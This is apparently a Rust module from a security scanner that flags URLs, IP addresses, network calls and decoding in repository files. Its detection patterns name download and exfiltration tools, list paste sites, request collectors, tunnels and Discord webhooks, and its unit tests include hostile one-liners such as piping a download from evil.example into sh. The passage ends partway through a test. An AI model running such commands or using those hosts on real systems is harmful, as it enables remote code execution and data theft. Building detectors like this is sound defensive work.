//! Finds network addresses in a file, and code that looks like a network call.
//!
//! This reads text patterns and doesn't understand the code. It sees addresses
//! written out as plain text, and a call on the same line as an address counts
//! as a call to it. It will miss anything encoded or split up, which is why
//! calls with no visible address get their own section in the report.

use crate::git::RepoFile;
pub(crate) use crate::report::Call;
use crate::report::{At, Kind, Report};
use crate::text::Untrusted;
use regex::bytes::Regex;
use std::net::{Ipv4Addr, Ipv6Addr};
use std::ops::Range;
use std::sync::LazyLock;

/// A slash may be written `\/` because JSON and minified code often escape it.
const URL_PATTERN: &str = r#"(?i-u)\b(?:https?|wss?|ftps?|sftp|ssh|git|tcp|udp|smb|ldaps?|rtsp|mqtts?|amqps?|redis|mongodb(?:\+srv)?|postgres(?:ql)?|mysql|telnet):(?:\\?/){2}(?:\[[0-9a-f:.]+\]|[^\x00-\x20\x7f"'`<>()\[\]\\|^,;]|\\/)+"#;

const IPV4_PATTERN: &str = r"(?-u)\b(?:\d{1,3}\.){3}\d{1,3}\b";

// `fetch` must have an argument, which skips unrelated methods like
// `$output->fetch()`. Command names must be followed by something that looks
// like an argument, which skips prose like "with curl or wget".
const CALL_PATTERN: &str = r#"(?xi-u)
    \b(?:
        fetch\s*\([^)\s]
      | axios(?:\.\w+)?\s*\(
      | got\.(?:get|post|put|stream)\s*\(
      | https?\.(?:get|post|head|request|newrequest(?:withcontext)?)\s*\(
      | http::(?:get|post|put|patch|delete|head)\s*\(
      | requests\.(?:get|post|put|patch|delete|head|request)\s*\(
      | httpx\.(?:get|post|put|patch|delete|head|request|stream)\s*\(
      | url(?:open|retrieve)\s*\(
      | reqwest::(?:get|client|blocking)
      | ureq::(?:get|post|put|request|agent)
      | net::http
      | xmlhttprequest
      | websocket\s*\(
      | sendbeacon\s*\(
      | eventsource\s*\(
      | socket\.(?:connect|create_connection)\s*\(
      | net\.(?:dial|connect|createconnection)\s*\(
      | tls\.(?:dial|connect)\s*\(
      | open(?:connection|stream)\s*\(
      | curl_(?:init|exec)\s*\(
      | (?:curl|wget|iwr|irm)\s+(?:[-"'$%@{`<]|[\w.-]+[.:/]\w)
      | invoke-(?:webrequest|restmethod)
      | download(?:string|file|data)\s*\(
      | start-bitstransfer
      | bitsadmin
      | certutil\s+-urlcache
      | new\s+(?:http|web)client
      | urlsession
      | request\.(?:get|post|put)\s*\(
      | superagent\.(?:get|post|put)\s*\(
      | needle\s*\(\s*['"](?:get|post)
      | undici\.(?:fetch|request)\s*\(
      | urllib3?\.\w*(?:urlopen|request)\s*\(
      | aiohttp\.
      | http\.client\.
      | dns\.(?:resolve\w*|lookup)\s*\(
      | new\s+net\.socket
      | dgram\.createsocket\s*\(
      | socket\.socket\s*\(
      | tcpclient\s*\(
      | fsockopen\s*\(
      | file_get_contents\s*\(\s*["']https?:
      | new\s+url\s*\([^)\n]{1,200}\)\.open
      | httparty\.(?:get|post)
      | faraday\.(?:get|post|new)
      | nslookup\s+[-\w$"']
    )
"#;

/// Code that turns hidden text back into something readable.
const DECODE_PATTERN: &str = r#"(?xi-u)
    \batob\s*\(
  | \bbuffer\.from\s*\([^)\n]{0,200}(?:base64|hex)
  | \bb64decode\b
  | \bbase64_decode\s*\(
  | \bfrombase64string\b
  | \bfromcharcode\b
  | \bunescape\s*\(
  | \bbytes\.fromhex\s*\(
  | \bhex2bin\s*\(
  | \bcodecs\.decode\s*\(
  | \bgzinflate\s*\(
  | \bzlib\.decompress\s*\(
  | \bstr_rot13\s*\(
  | \bbase64\s+(?:-d|-D|--decode)\b
  | \bxxd\s+-r\b
  | \bdecode64\b
  | \bbase64\.(?:decode|urldecode|urlsafe_decode)\b
  | \b(?:b32|b85|a85|urlsafe_b64|standard_b64)decode\b
  | \bbinascii\.(?:unhexlify|a2b_base64)\b
  | \bmarshal\.loads\b
  | \brot13\b
  | \bpack\s*\(\s*["']H
  | \bunpack\s*\(\s*["'][mu]
  | \bopenssl\s+(?:enc|base64)\b[^\n]{0,40}\s-d\b
  | \bcertutil(?:\.exe)?\s+-decode\b
  | \b__import__\s*\(\s*["'](?:base64|zlib|codecs|marshal|binascii|bz2|lzma)["']\s*\)
"#;

pub(crate) static URL: LazyLock<Regex> = LazyLock::new(|| compile(URL_PATTERN));
static IPV4: LazyLock<Regex> = LazyLock::new(|| compile(IPV4_PATTERN));
pub(crate) static CALL: LazyLock<Regex> = LazyLock::new(|| compile(CALL_PATTERN));
pub(crate) static DECODE: LazyLock<Regex> = LazyLock::new(|| compile(DECODE_PATTERN));

fn compile(pattern: &str) -> Regex {
    Regex::new(pattern).expect("patterns are constants covered by tests")
}

/// How far either side of a match to look for a related call or address.
const NEARBY_BYTES: usize = 120;
/// How close decoding must be to a call to count as hiding its address, as in
/// `const url = atob(x);` followed by `fetch(url);`.
const DECODE_NEARBY_LINES: usize = 3;
const DECODE_NEARBY_BYTES: usize = 400;
/// Git treats a file as binary if its first 8000 bytes contain a zero byte.
const BINARY_CHECK_BYTES: usize = 8000;
const HOST_BUILT_AT_RUN_TIME: &str = "(host is built at run time)";

/// Cloud servers hand out credentials at this address, so code reaching for it
/// is notable even though it isn't on the public internet.
const CLOUD_METADATA_HOSTS: [&str; 3] = [
    "169.254.169.254",
    "metadata.google.internal",
    "[fd00:ec2::254]",
];

/// Public DNS services, which programs contact by IP address for honest reasons.
const WELL_KNOWN_IPS: [&str; 8] = [
    "1.1.1.1",
    "1.0.0.1",
    "8.8.8.8",
    "8.8.4.4",
    "9.9.9.9",
    "149.112.112.112",
    "208.67.222.222",
    "208.67.220.220",
];

const STORES_FILES: &str = "Stores text or files for anyone to download";
const COLLECTS_DATA: &str = "Collects whatever is sent to it";
const TUNNELS: &str = "Tunnels to someone's own computer";
const SHORT_LINKS: &str = "Hides the real address behind a short link";
const SHOWS_IP: &str = "Reveals this computer's public address";
const CHAT: &str = "Chat services that can receive messages from code";
const TOR: &str = "Tor hidden services";

/// Services that are useful to anyone, and especially to attackers, who use them
/// to keep the real payload out of the repository or to receive what they steal.
const RISKY_HOSTS: [(&str, &str); 44] = [
    ("api.npoint.io", STORES_FILES),
    ("jsonkeeper.com", STORES_FILES),
    ("jsonbin.io", STORES_FILES),
    ("pastebin.com", STORES_FILES),
    ("paste.ee", STORES_FILES),
    ("hastebin.com", STORES_FILES),
    ("rentry.co", STORES_FILES),
    ("dpaste.com", STORES_FILES),
    ("transfer.sh", STORES_FILES),
    ("file.io", STORES_FILES),
    ("0x0.st", STORES_FILES),
    ("temp.sh", STORES_FILES),
    ("catbox.moe", STORES_FILES),
    ("gofile.io", STORES_FILES),
    ("bashupload.com", STORES_FILES),
    ("webhook.site", COLLECTS_DATA),
    ("requestbin.com", COLLECTS_DATA),
    ("requestcatcher.com", COLLECTS_DATA),
    ("pipedream.net", COLLECTS_DATA),
    ("interact.sh", COLLECTS_DATA),
    ("oast.fun", COLLECTS_DATA),
    ("oast.pro", COLLECTS_DATA),
    ("oast.live", COLLECTS_DATA),
    ("burpcollaborator.net", COLLECTS_DATA),
    ("dnslog.cn", COLLECTS_DATA),
    ("ngrok.io", TUNNELS),
    ("ngrok-free.app", TUNNELS),
    ("trycloudflare.com", TUNNELS),
    ("serveo.net", TUNNELS),
    ("loca.lt", TUNNELS),
    ("bit.ly", SHORT_LINKS),
    ("tinyurl.com", SHORT_LINKS),
    ("t.ly", SHORT_LINKS),
    ("is.gd", SHORT_LINKS),
    ("rb.gy", SHORT_LINKS),
    ("cutt.ly", SHORT_LINKS),
    ("shorturl.at", SHORT_LINKS),
    ("ipinfo.io", SHOWS_IP),
    ("ip-api.com", SHOWS_IP),
    ("ipify.org", SHOWS_IP),
    ("checkip.amazonaws.com", SHOWS_IP),
    ("icanhazip.com", SHOWS_IP),
    ("ifconfig.me", SHOWS_IP),
    ("ipapi.co", SHOWS_IP),
];
/// For these only one part of the service is risky, so the path counts too.
const RISKY_ADDRESSES: [(&str, &str); 4] = [
    ("discord.com/api/webhooks", CHAT),
    ("discordapp.com/api/webhooks", CHAT),
    ("cdn.discordapp.com/attachments", STORES_FILES),
    ("api.telegram.org/bot", CHAT),
];

const TEST_FOLDERS: [&str; 14] = [
    "test",
    "tests",
    "testing",
    "testdata",
    "test-data",
    "test_data",
    "__tests__",
    "__fixtures__",
    "__snapshots__",
    "__mocks__",
    "fixtures",
    "fixture",
    "spec",
    "e2e",
];
const SCRIPT_EXTENSIONS: [&str; 22] = [
    "js", "mjs", "cjs", "ts", "mts", "cts", "jsx", "tsx", "vue", "svelte", "html", "htm", "py",
    "rb", "php", "sh", "bash", "zsh", "ps1", "bat", "cmd", "pl",
];
const TEST_NAME_MARKS: [&str; 5] = ["_test.", ".test.", ".spec.", "_spec.", "-test."];
/// In these, `#` starts private names and such rather than a comment.
const SCRIPT_EXTENSIONS_WITHOUT_HASH_COMMENTS: [&str; 10] = [
    "js", "mjs", "cjs", "ts", "mts", "cts", "jsx", "tsx", "vue", "svelte",
];

const LOCKFILES: [&str; 14] = [
    "bun.lock",
    "cargo.lock",
    "composer.lock",
    "flake.lock",
    "gemfile.lock",
    "go.sum",
    "mix.lock",
    "npm-shrinkwrap.json",
    "package-lock.json",
    "pipfile.lock",
    "pnpm-lock.yaml",
    "poetry.lock",
    "uv.lock",
    "yarn.lock",
];
const DOCUMENT_EXTENSIONS: [&str; 5] = [".adoc", ".markdown", ".md", ".mdx", ".rst"];
const DOCUMENT_NAMES: [&str; 6] = [
    "authors",
    "changelog",
    "copying",
    "licence",
    "license",
    "notice",
];

const CI_FOLDERS: [&str; 5] = [
    ".github/",
    ".gitlab/",
    ".circleci/",
    ".buildkite/",
    ".azure-pipelines/",
];
/// Scripts a CI server runs by itself. Other languages in a CI folder get full
/// checks, because ordinary code can load a module from any folder, and a CI
/// folder would otherwise be a good place to hide one.
const SHELL_EXTENSIONS: [&str; 6] = ["sh", "bash", "zsh", "ps1", "bat", "cmd"];
/// Domains set aside for examples and tests, where nobody can run a server.
const RESERVED_DOMAINS: [&str; 6] = [
    "example.com",
    "example.org",
    "example.net",
    "example",
    "invalid",
    "test",
];
const CI_FILES: [&str; 6] = [
    ".gitlab-ci.yml",
    ".travis.yml",
    ".drone.yml",
    "azure-pipelines.yml",
    "bitbucket-pipelines.yml",
    "jenkinsfile",
];

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum FileClass {
    Documentation,
    Lockfile,
    /// CI config and container builds. They can contact the internet, but on a
    /// CI server or inside a container rather than directly on this computer.
    RunsElsewhere,
    Code,
}

/// Records every address and network call in a file.
pub fn scan(file: &RepoFile, report: &mut Report) {
    let class = classify(file.path.raw());
    let binary = is_binary(&file.contents);

    scan_urls(file, class, binary, report);
    // Version numbers in lockfiles look exactly like IP addresses.
    if class != FileClass::Lockfile {
        scan_ips(file, class, binary, report);
    }
    if matches!(class, FileClass::Code | FileClass::RunsElsewhere) && !binary {
        scan_calls(file, class, report);
    }
}

fn scan_urls(file: &RepoFile, class: FileClass, binary: bool, report: &mut Report) {
    let contents = file.contents.as_slice();
    let mut lines = LineCounter::new(contents, binary);

    for found in URL.find_iter(contents) {
        let url = clean_url(found.as_bytes());
        let Some(host) = host_of(&url) else {
            continue;
        };
        let call = is_near_call(contents, found.start(), found.end());
        let line = lines.line_at(found.start());
        let at = Some(At {
            path: &file.path,
            line,
        });

        // A call to `https://${HOST}/x` doesn't reveal where it really goes.
        let is_code = matches!(class, FileClass::Code | FileClass::RunsElsewhere);
        if is_code && call && is_built_at_run_time(&host) {
            report.add(Kind::CallWithoutAddress, "", &url, at);
            remember_call(file, "", &url, line, report);
            continue;
        }

        let kind = address_kind(class, &host, call);
        let group = if is_built_at_run_time(&host) {
            HOST_BUILT_AT_RUN_TIME
        } else {
            host.as_str()
        };
        report.add(kind, group, &url, at);
        if matches!(kind, Kind::NetworkCall | Kind::CallsRawIp) {
            remember_call(file, group, &url, line, report);
        }
        if class == FileClass::Code {
            if let Some(service) = risky_service(&host, &url) {
                report.add(Kind::RiskyHost, service, &url, at);
            }
        }
    }
}

/// What kind of risky service an address belongs to, if any.
fn risky_service(host: &str, url: &str) -> Option<&'static str> {
    if host.ends_with(".onion") {
        return Some(TOR);
    }
    let on_host = |known: &str| {
        host == known
            || host
                .strip_suffix(known)
                .is_some_and(|rest| rest.ends_with('.'))
    };
    let address = url.split_once("://").map_or(url, |(_, rest)| rest);
    let address = address.to_ascii_lowercase();

    RISKY_HOSTS
        .iter()
        .find(|(known, _)| on_host(known))
        .or_else(|| {
            RISKY_ADDRESSES
                .iter()
                .find(|(known, _)| address.starts_with(known))
        })
        .map(|(_, service)| *service)
}

fn remember_call(
    file: &RepoFile,
    group: &str,
    subject: &str,
    line: Option<u64>,
    report: &mut Report,
) {
    report.record_call(
        file.path.raw(),
        Call {
            group: group.to_string(),
            subject: subject.to_string(),
            line,
        },
    );
}

fn scan_ips(file: &RepoFile, class: FileClass, binary: bool, report: &mut Report) {
    let contents = file.contents.as_slice();
    let mut lines = LineCounter::new(contents, binary);

    for found in IPV4.find_iter(contents) {
        if !stands_alone(contents, found.start(), found.end()) {
            continue;
        }
        let text = String::from_utf8_lossy(found.as_bytes());
        if text.parse::<Ipv4Addr>().is_err() {
            continue;
        }
        let call = is_near_call(contents, found.start(), found.end());
        let kind = address_kind(class, &text, call);
        let line = lines.line_at(found.start());
        report.add(
            kind,
            "",
            &text,
            Some(At {
                path: &file.path,
                line,
            }),
        );
        if matches!(kind, Kind::NetworkCall | Kind::CallsRawIp) {
            remember_call(file, "", &text, line, report);
        }
    }
}

/// Lists calls with no address beside them. These matter most when nothing else
/// shows up, because `fetch(atob("..."))` leaves no address to find. When text
/// is being decoded just before the call, that looks deliberate.
fn scan_calls(file: &RepoFile, class: FileClass, report: &mut Report) {
    let contents = file.contents.as_slice();
    let mut lines = LineCounter::new(contents, false);

    for found in CALL.find_iter(contents) {
        let nearby = surrounding_line(contents, found.start(), found.end());
        if URL.is_match(nearby) || IPV4.is_match(nearby) {
            continue;
        }
        // Decoding after a call can't be what hid that call's address.
        let earlier = lines_before(
            contents,
            found.start(),
            DECODE_NEARBY_LINES,
            DECODE_NEARBY_BYTES,
        );
        let hides =
            class == FileClass::Code && (DECODE.is_match(nearby) || DECODE.is_match(earlier));
        let kind = if hides {
            Kind::HidesConnection
        } else {
            Kind::CallWithoutAddress
        };

        let snippet = Untrusted::from_bytes(nearby.trim_ascii());
        let line = lines.line_at(found.start());
        report.add(
            kind,
            "",
            snippet.raw(),
            Some(At {
                path: &file.path,
                line,
            }),
        );
        remember_call(file, "", snippet.raw(), line, report);
    }
}

fn address_kind(class: FileClass, host: &str, near_call: bool) -> Kind {
    match class {
        FileClass::Documentation => Kind::DocumentationAddress,
        FileClass::Lockfile => Kind::LockfileAddress,
        FileClass::Code | FileClass::RunsElsewhere if is_local(host) => Kind::LocalAddress,
        FileClass::Code if near_call && is_unexplained_ip(host) => Kind::CallsRawIp,
        FileClass::Code | FileClass::RunsElsewhere if near_call => Kind::NetworkCall,
        FileClass::Code | FileClass::RunsElsewhere if is_ip(host) => Kind::IpAddress,
        FileClass::Code | FileClass::RunsElsewhere => Kind::MentionedAddress,
    }
}

/// Only sorts findings into sections, so a wrong guess can't hide anything. The
/// checks are narrow because a script named `license.js` is not documentation.
pub(crate) fn classify(path: &str) -> FileClass {
    let lower = path.to_ascii_lowercase();
    let name = lower.rsplit('/').next().unwrap_or(&lower);

    if LOCKFILES.contains(&name) {
        return FileClass::Lockfile;
    }
    let in_ci_folder = CI_FOLDERS
        .iter()
        .any(|folder| lower.starts_with(folder) || lower.contains(&format!("/{folder}")));
    let is_dockerfile = name == "dockerfile"
        || name.ends_with(".dockerfile")
        || (name.starts_with("dockerfile.") && !is_script(name, b""));
    let extension = name.rsplit_once('.').map_or("", |(_, extension)| extension);
    let could_be_loaded_by_code = is_script(name, b"") && !SHELL_EXTENSIONS.contains(&extension);
    let runs_on_ci_server = in_ci_folder && !could_be_loaded_by_code;
    if runs_on_ci_server || CI_FILES.contains(&name) || is_dockerfile {
        return FileClass::RunsElsewhere;
    }
    let document_extension = DOCUMENT_EXTENSIONS.iter().any(|ext| name.ends_with(ext));
    let document_name = DOCUMENT_NAMES.iter().any(|known| name.starts_with(known));
    let readme_or_notice = document_name && (!name.contains('.') || name.ends_with(".txt"));

    if document_extension || readme_or_notice {
        FileClass::Documentation
    } else {
        FileClass::Code
    }
}

/// Whether a host name is reserved, so nobody can really be there. The whole name
/// has to match, because anyone can register `evilexample.com`.
pub(crate) fn is_reserved_host(host: &str) -> bool {
    RESERVED_DOMAINS.iter().any(|domain| {
        host == *domain
            || host
                .strip_suffix(domain)
                .is_some_and(|rest| rest.ends_with('.'))
    })
}

/// Whether a file is part of a project's tests. Tests of how code handles strange
/// input are full of strange input, so some checks want stronger evidence here.
/// Attackers can hide things in tests too, so this never excuses anything outright.
pub(crate) fn is_test_path(path: &str) -> bool {
    let lower = path.to_ascii_lowercase();
    let mut pieces = lower.rsplit('/');
    let name = pieces.next().unwrap_or(&lower);

    // Folders like `app.tests.integration` count too.
    pieces.any(|folder| folder.split('.').any(|part| TEST_FOLDERS.contains(&part)))
        || TEST_NAME_MARKS.iter().any(|mark| name.contains(mark))
        || name.starts_with("test_")
}

/// Whether a file is a program, as opposed to data or settings. Decoding, joining
/// pieces of text and so on only mean something in a file that can do those things.
pub(crate) fn is_script(path: &str, contents: &[u8]) -> bool {
    let name = path.rsplit('/').next().unwrap_or(path).to_ascii_lowercase();
    let extension = name.rsplit_once('.').map_or("", |(_, extension)| extension);

    SCRIPT_EXTENSIONS.contains(&extension) || contents.starts_with(b"#!")
}

/// Whether the text at an offset sits in a comment, so it can't run.
///
/// This only looks at the start of the line, and is deliberately cautious, because
/// an attacker can read this too. `${}` inside a JavaScript template string runs
/// even on a line that starts with `//`, and `#` isn't a comment in JavaScript.
pub(crate) fn is_in_comment(contents: &[u8], offset: usize, path: &str) -> bool {
    let line_start = contents[..offset]
        .iter()
        .rposition(|byte| *byte == b'\n')
        .map_or(0, |newline| newline + 1);
    let before = contents[line_start..offset].trim_ascii_start();
    if before.windows(2).any(|window| window == b"${") {
        return false;
    }

    let extension = path.rsplit_once('.').map_or("", |(_, extension)| extension);
    let extension = extension.to_ascii_lowercase();
    let hash_is_comment = !SCRIPT_EXTENSIONS_WITHOUT_HASH_COMMENTS.contains(&extension.as_str());
    let closes = |mark: &[u8]| before.windows(mark.len()).any(|window| window == mark);

    before.starts_with(b"//")
        || (before.starts_with(b"#") && !before.starts_with(b"#!") && hash_is_comment)
        || (before.starts_with(b"/*") && !closes(b"*/"))
        || (before.starts_with(b"<!--") && !closes(b"-->"))
        || before.len() >= 4 && before[..4].eq_ignore_ascii_case(b"rem ")
        || before.starts_with(b"::")
}

pub(crate) fn is_binary(contents: &[u8]) -> bool {
    contents[..contents.len().min(BINARY_CHECK_BYTES)].contains(&0)
}

/// Normalizes a raw match into the URL it most likely represents.
pub(crate) fn clean_url(raw: &[u8]) -> String {
    let untrusted = Untrusted::from_bytes(raw);
    let mut url = untrusted.raw().replace("\\/", "/");

    loop {
        let trimmed = url.trim_end_matches(['.', ':', '!', '?', '*', '_', '~', '=', '+', '&', '#']);
        let open = trimmed.matches('{').count();
        let close = trimmed.matches('}').count();
        let without_brace = trimmed.strip_suffix('}').filter(|_| close > open);
        let next = without_brace.unwrap_or(trimmed).to_string();
        if next.len() == url.len() {
            return url;
        }
        url = next;
    }
}

/// The host a URL really points at, as opposed to the one it may appear to.
/// In `https://bank.example@evil.example/` the host is `evil.example`.
pub(crate) fn host_of(url: &str) -> Option<String> {
    let (_, rest) = url.split_once("://")?;
    let authority = rest.split(['/', '?', '#']).next()?;
    let host_and_port = authority
        .rsplit_once('@')
        .map_or(authority, |(_, after)| after);

    let host = if host_and_port.starts_with('[') {
        match host_and_port.find(']') {
            Some(end) => &host_and_port[..=end],
            None => host_and_port,
        }
    } else {
        match host_and_port.rsplit_once(':') {
            Some((before, port)) if port.bytes().all(|byte| byte.is_ascii_digit()) => before,
            _ => host_and_port,
        }
    };

    (!host.is_empty()).then(|| host.to_lowercase())
}

fn is_built_at_run_time(host: &str) -> bool {
    host.contains(['$', '{', '}', '%', '*'])
}

/// Code that really means to reach a service uses its name. An address alone
/// can't be looked up or read, which is why hand-rolled malware servers use them.
fn is_unexplained_ip(host: &str) -> bool {
    is_ip(host) && !WELL_KNOWN_IPS.contains(&host) && !CLOUD_METADATA_HOSTS.contains(&host)
}

fn is_ip(host: &str) -> bool {
    host.parse::<Ipv4Addr>().is_ok() || parse_ipv6(host).is_some()
}

fn parse_ipv6(host: &str) -> Option<Ipv6Addr> {
    host.strip_prefix('[')?.strip_suffix(']')?.parse().ok()
}

/// Whether an address stays on the machine or local network, or can't be routed
/// at all. Listed separately because it isn't an outside connection.
pub(crate) fn is_local(host: &str) -> bool {
    if CLOUD_METADATA_HOSTS.contains(&host) {
        return false;
    }
    if host == "localhost"
        || host.ends_with(".localhost")
        || host.ends_with(".local")
        || host.ends_with(".internal")
    {
        return true;
    }
    if let Ok(ip) = host.parse::<Ipv4Addr>() {
        let [first, ..] = ip.octets();
        return ip.is_loopback()
            || ip.is_private()
            || ip.is_link_local()
            || ip.is_documentation()
            || first == 0
            || first >= 224;
    }
    if let Some(ip) = parse_ipv6(host) {
        return ip.is_loopback()
            || ip.is_unspecified()
            || ip.is_unique_local()
            || ip.is_unicast_link_local();
    }
    false
}

/// Rules out numbers that are part of something longer, such as `pkg-1.2.3.4`
/// or `1.2.3.4.5`. The `/` also skips hosts the URL search already listed.
fn stands_alone(contents: &[u8], start: usize, end: usize) -> bool {
    let before = start.checked_sub(1).map(|at| contents[at]);
    let after = contents.get(end).copied();
    let after_next = contents.get(end + 1).copied();

    let joined_before = matches!(before, Some(b'.' | b'-' | b'_' | b'/' | b'@' | b'~' | b'^'));
    let joined_after = matches!(after, Some(b'-' | b'_'))
        || (after == Some(b'.') && after_next.is_some_and(|byte| byte.is_ascii_digit()));

    !joined_before && !joined_after
}

/// Whether a call sits beside an address. The address is masked first, so a link
/// that merely contains a word like `XMLHttpRequest` doesn't count as a call.
fn is_near_call(contents: &[u8], start: usize, end: usize) -> bool {
    let line = surrounding_range(contents, start, end);
    let mut masked = contents[line.start..start].to_vec();
    masked.push(b'"');
    masked.extend_from_slice(&contents[end..line.end]);
    CALL.is_match(&masked)
}

pub(crate) fn surrounding_line(contents: &[u8], start: usize, end: usize) -> &[u8] {
    &contents[surrounding_range(contents, start, end)]
}

/// The part of the line around a match, kept short because one line of minified
/// code can be megabytes long.
fn surrounding_range(contents: &[u8], start: usize, end: usize) -> Range<usize> {
    let from = start.saturating_sub(NEARBY_BYTES);
    let to = end.saturating_add(NEARBY_BYTES).min(contents.len());

    let line_start = contents[from..start]
        .iter()
        .rposition(|byte| *byte == b'\n')
        .map_or(from, |newline| from + newline + 1);
    let line_end = contents[end..to]
        .iter()
        .position(|byte| *byte == b'\n')
        .map_or(to, |newline| end + newline);

    line_start..line_end
}

/// The lines around a match, within a limit on bytes. A stretch of bytes with no
/// line breaks means minified code, where being close means much less, so that
/// gets the much narrower single-line view.
pub(crate) fn nearby_lines(
    contents: &[u8],
    start: usize,
    end: usize,
    lines: usize,
    max_bytes: usize,
) -> &[u8] {
    let from = start.saturating_sub(max_bytes);
    let to = end.saturating_add(max_bytes).min(contents.len());
    let before = &contents[from..start];
    let after = &contents[end..to];

    let reached_limit = before.len() == max_bytes || after.len() == max_bytes;
    if reached_limit && !before.contains(&b'\n') && !after.contains(&b'\n') {
        return surrounding_line(contents, start, end);
    }

    let first = before
        .iter()
        .enumerate()
        .rev()
        .filter(|(_, byte)| **byte == b'\n')
        .nth(lines)
        .map_or(from, |(at, _)| from + at + 1);
    let last = after
        .iter()
        .enumerate()
        .filter(|(_, byte)| **byte == b'\n')
        .nth(lines)
        .map_or(to, |(at, _)| end + at);

    &contents[first..last]
}

/// The lines just before a position. Empty in minified code, where there are no
/// separate lines to speak of.
fn lines_before(contents: &[u8], start: usize, lines: usize, max_bytes: usize) -> &[u8] {
    let from = start.saturating_sub(max_bytes);
    let before = &contents[from..start];
    if before.len() == max_bytes && !before.contains(&b'\n') {
        return &[];
    }

    let first = before
        .iter()
        .enumerate()
        .rev()
        .filter(|(_, byte)| **byte == b'\n')
        .nth(lines)
        .map_or(from, |(at, _)| from + at + 1);
    &contents[first..start]
}

/// Works out line numbers for matches that arrive in order, without recounting
/// from the top of the file each time.
pub(crate) struct LineCounter<'a> {
    contents: &'a [u8],
    position: usize,
    line: u64,
    binary: bool,
}

impl<'a> LineCounter<'a> {
    pub(crate) fn new(contents: &'a [u8], binary: bool) -> Self {
        Self {
            contents,
            position: 0,
            line: 1,
            binary,
        }
    }

    pub(crate) fn line_at(&mut self, offset: usize) -> Option<u64> {
        if self.binary {
            return None;
        }
        let newlines = self.contents[self.position..offset]
            .iter()
            .filter(|byte| **byte == b'\n')
            .count();
        self.line += newlines as u64;
        self.position = offset;
        Some(self.line)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn scan_text(path: &str, contents: &[u8]) -> Report {
        let file = RepoFile {
            path: Untrusted::from_bytes(path.as_bytes()),
            contents: contents.to_vec(),
        };
        let mut report = Report::new();
        scan(&file, &mut report);
        report
    }

    fn subjects(report: &Report, kind: Kind) -> Vec<String> {
        report
            .listed(kind)
            .into_iter()
            .map(|(subject, _)| subject)
            .collect()
    }

    #[test]
    fn finds_addresses_in_many_protocols() {
        for url in [
            "http://a.example/x",
            "https://a.example/x?y=1&z=2#top",
            "HTTPS://A.example/x",
            "ws://a.example/socket",
            "wss://a.example/socket",
            "ftp://a.example/file",
            "ssh://git@a.example/repo",
            "tcp://a.example:9000",
            "redis://a.example:6379/0",
            "mongodb+srv://user:pw@a.example/db",
            "postgres://a.example/db",
        ] {
            let report = scan_text("config.yml", format!("x: {url}\n").as_bytes());

            assert_eq!(
                subjects(&report, Kind::MentionedAddress),
                [url],
                "input: {url}"
            );
        }
    }

    #[test]
    fn finds_addresses_escaped_for_json() {
        let report = scan_text("a.json", br#"{"u":"https:\/\/evil.example\/x"}"#);

        assert_eq!(
            subjects(&report, Kind::MentionedAddress),
            ["https://evil.example/x"]
        );
    }

    #[test]
    fn stops_at_the_end_of_the_address() {
        for (text, expected) in [
            ("see https://a.example/x.", "https://a.example/x"),
            ("(https://a.example/x)", "https://a.example/x"),
            ("[a](https://a.example/x)", "https://a.example/x"),
            ("\"https://a.example/x\",", "https://a.example/x"),
            ("<https://a.example/x>", "https://a.example/x"),
            ("{\"u\":\"https://a.example\"}", "https://a.example"),
            ("x = {https://a.example}", "https://a.example"),
            ("**https://a.example/x**", "https://a.example/x"),
            ("`https://${h}.example/${p}`", "https://${h}.example/${p}"),
        ] {
            let report = scan_text("a.yml", text.as_bytes());

            assert_eq!(
                subjects(&report, Kind::MentionedAddress),
                [expected],
                "input: {text}"
            );
        }
    }

    #[test]
    fn groups_by_the_real_host_not_the_one_it_appears_to_be() {
        for (url, host) in [
            ("https://bank.example@evil.example/x", "evil.example"),
            ("https://u:p@evil.example:8443/x", "evil.example"),
            ("https://EVIL.example/x", "evil.example"),
            ("https://evil.example?x=@bank.example", "evil.example"),
            ("http://[2001:4860::1]:80/x", "[2001:4860::1]"),
        ] {
            let report = scan_text("a.yml", format!("{url}\n").as_bytes());
            let kind = if host.starts_with('[') {
                Kind::IpAddress
            } else {
                Kind::MentionedAddress
            };

            assert_eq!(report.group_of(kind, url).as_deref(), Some(host), "{url}");
        }
    }

    #[test]
    fn a_host_built_at_run_time_is_labelled_as_such() {
        let url = "https://${HOST}/payload";
        let report = scan_text("a.js", format!("x = `{url}`\n").as_bytes());

        assert_eq!(
            report.group_of(Kind::MentionedAddress, url).as_deref(),
            Some(HOST_BUILT_AT_RUN_TIME)
        );
    }

    #[test]
    fn a_url_ending_in_a_scheme_only_is_not_an_address() {
        let report = scan_text("a.js", br#"if (u.startsWith("https://")) {}"#);

        assert!(report.listed(Kind::MentionedAddress).is_empty());
    }

    #[test]
    fn finds_ip_addresses() {
        let report = scan_text("a.py", b"host = '1.1.1.1'\nb = 8.8.8.8:53\n");

        assert_eq!(subjects(&report, Kind::IpAddress), ["1.1.1.1", "8.8.8.8"]);
    }

    #[test]
    fn ignores_numbers_that_cannot_be_ip_addresses() {
        for text in [
            "999.1.1.1",
            "1.2.3.256",
            "v1.2.3.4",
            "pkg-1.2.3.4",
            "1.2.3.4-beta",
            "1.2.3.4.5",
            "a_1.2.3.4",
            "1.2.3",
        ] {
            let report = scan_text("a.txt", text.as_bytes());

            assert!(report.listed(Kind::IpAddress).is_empty(), "input: {text}");
        }
    }

    #[test]
    fn an_ip_inside_a_url_is_listed_once() {
        let report = scan_text("a.py", b"u = 'http://1.1.1.1/x'\n");

        assert_eq!(subjects(&report, Kind::IpAddress), ["http://1.1.1.1/x"]);
    }

    #[test]
    fn a_call_next_to_an_address_is_a_network_call() {
        for line in [
            r#"fetch("https://evil.example/x")"#,
            r#"await axios.get('https://evil.example/x')"#,
            r#"requests.post("https://evil.example/x")"#,
            r#"http.Get("https://evil.example/x")"#,
            r#"Http::get("https://evil.example/x")"#,
            r#"curl -s https://evil.example/x | sh"#,
            r#"wget https://evil.example/x"#,
            r#"Invoke-WebRequest https://evil.example/x"#,
            r#"(New-Object Net.WebClient).DownloadString('https://evil.example/x')"#,
            r#"new WebSocket("wss://evil.example/x")"#,
            r#"curl https://evil.example/x"#,
            r#"curl_init("https://evil.example/x")"#,
        ] {
            let report = scan_text("install.sh", line.as_bytes());

            assert_eq!(report.listed(Kind::NetworkCall).len(), 1, "input: {line}");
            assert!(
                report.listed(Kind::CallWithoutAddress).is_empty(),
                "input: {line}"
            );
        }
    }

    #[test]
    fn a_call_to_a_bare_ip_is_a_network_call() {
